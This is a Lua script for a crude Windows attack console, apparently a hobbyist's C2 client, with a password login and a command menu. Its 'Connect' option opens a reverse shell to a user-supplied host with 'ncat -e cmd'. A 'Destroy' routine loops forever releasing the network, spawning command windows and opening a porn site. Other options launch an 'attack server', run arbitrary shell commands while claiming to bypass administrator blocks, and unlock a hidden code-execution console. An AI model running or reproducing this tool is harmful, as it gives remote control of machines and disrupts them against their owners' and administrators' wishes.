-- imports
require"base64"
-- definitions
-- variables then functions
message = 'Anal beads'
secretkey = 'Hans'
mode = 'main'

welcomed = false
loggedin = false

function nothing()
end
function cls()
	os.execute('cls')
end

function exec_lua(code)
    local chunk, err = loadstring(code)
    if chunk then
        local success, result = pcall(chunk)
        if success then
            return result
        else
            return nil, "Error executing Lua code: " .. result
        end
    else
        return nil, "Error loading Lua code: " .. err
    end
end
function devmode()
	io.write('Janco> ')
	cs = io.read()
	if cs == 'exit' then
		mode = 'main'
		main_mode()
	else
		exec_lua(cs)
	end
end

function readCredentials()
    local file = io.open("settings.hr", "r")
    if file then
        local data = file:read("*a")
        file:close()
        if data ~= "" then
            local decoded = base64.decode(data)
            local username, password = decoded:match("([^:]+):([^:]+)")
            return username, password
        end
    end
    return nil, nil
end
function encrypt(a)
	b = base64.encode(a)
	return b
end

function decrypt(a)


	b = base64.decode(b)
	return b
end
function welcome(name)

	io.write('Welcome back ',name,'!')
	print('')
	welcomed = 1
	return welcomed

end

function Exit()
	print('Bye!')
	os.exit()
end

function logginscrean()
	while not loggedin do
		io.write('Username: ')
		attempted_username = io.read()
		io.write('Password: ')
		attempted_password = io.read()
		if attempted_username == username and attempted_password == password then
			cls()
			loggedin = true
			print('Login successful!')
			main_mode()
		else
			print('Incorrect username and password , try again')
		end
	end
end

function SSM_mode()
	while mode == 'SSM' do
		io.write(attempted_username,'> ')
		cmd = io.read()
		if cmd == 'exit' or cmd == 'Exit' then
		print('Going back to main mode...')
		mode = 'main'
		main_mode()
		elseif cmd == 'help' or cmd == 'Help' then
		print('Welcome to Secure Shell Mode , a way of executing cmd commands with slightly more privacy and on some versions of windows it bypasses the "Command prompt is disabled by administator " error')
		print('You can run any command that your OS supports using this or run "exit" to go back to normal mode')
		else
		os.execute(cmd)
		end
	end
end

function main_mode()
	while loggedin and mode == 'main' do

		if not welcomed then
			welcome(attempted_username)
		end

		io.write('command> ')
		command = io.read()

		if command == 'help' or command == 'Help' or command == '2' then
			print('1. Exit - Exits the program')
			print('2. Help - Shows this')
			print('3. Encrypt - Base64 encrypt some text')
			print('4. Decrypt - Base64 decrypt some text')
			print('5. SSM - Activates secure shell mode')
			print('6. Logout - Logs out')
			print('7. Destroy - Self destructs the current windows system')
			print('8. Attack - Enters attack mode for the C2 and starts the attack server')
			print('9. Connect - connects to a ncat listener')
			print('10. Admin - Enters the admin console')

		elseif command == 'Exit' or command == 'exit' or command == '1' then
			Exit()
		elseif command == 'Encrypt' or command == '3' then
			io.write('Text: ')
			encText = io.read()
			print(encrypt(encText))
		elseif command == 'Decrypt' or command == '4' then
			io.write('Text: ')
			encText = io.read()
			print(decrypt(encText))
		elseif command == 'SSM' or command == 'ssm' or command == '5' then
			mode = 'SSM'
			print('Activating Secure Shell Mode...')
			print('Welcome to SSM , a way to execute cmd commands with slightly more privacy and is also harder to disable.')
			print('for more info run "help" or to go back to normal mode run "exit" ')
			SSM_mode()

		elseif command == 'logout' or command == 'lgt' or command == '6' then
			loggedin = false
			logginscrean()
		elseif command == 'Destroy' or command == '7' then
			print("Please type in the pin: ")
			io.write("Pin: ")
			pin = io.read()
			if pin == '6969' then
				print('Trying to destroy system...')
				while true do
					os.execute('start https://pornhub.com')
					os.execute('ipconfig /release')
					os.execute('start cmd')
					-- Should add this to startup
				end
			else
				print('Wrong pin...')
				Exit()
			end
		elseif command == 'Attack' or command == 'attack' or command == '8' then
			print('Entering attack mode...')
			os.execute('cd assets && server.exe')
		elseif command == 'connect' or command == 'Connect' or command == '9' then
			io.write('Ip: ')
			ipad = io.read()
			io.write('Port: ')
			cport = io.read()
			os.execute('ncat ' .. ipad .. ' ' .. cport .. ' -e cmd')
		elseif command == 'admin' or command == 'Admin' or command == '10' then
			os.execute('lua admin.lua')
		elseif command == 'cls' or command == 'clear' then
			os.execute('cls')
		elseif command == '6942069' then
			print('Dev console unlocked!')
			mode = 'dev'
			while mode == 'dev' do
				devmode()
			end
		elseif command == '' or command == 'nothing' or command == 'Nothing' then
			nothing()
		else
			print('Syntax error: ' .. command .. ' isnt a valid command!')
		end
	end
end

---------------------------------------------- execute ----------------------------------------------------
username, password = readCredentials()
logginscrean()
---------------------------------------------- execution ends ---------------------------------------------
